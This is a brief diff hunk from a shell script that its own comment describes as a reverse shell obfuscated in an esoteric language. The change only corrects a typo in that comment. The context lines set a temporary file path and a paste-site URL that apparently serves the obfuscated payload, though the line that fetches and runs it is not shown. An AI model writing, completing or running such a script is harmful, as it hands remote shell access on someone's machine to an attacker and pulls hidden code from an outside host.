@@ -1,5 +1,5 @@
 #!/bin/sh
-#reverse shell obfuscated in braifl*uck
+#reverse shell obfuscated in brain*uck
 
 FILE=$TMPDIR/+++++
 BRAIN=https://paste.c-net.org/DisobeyPajama
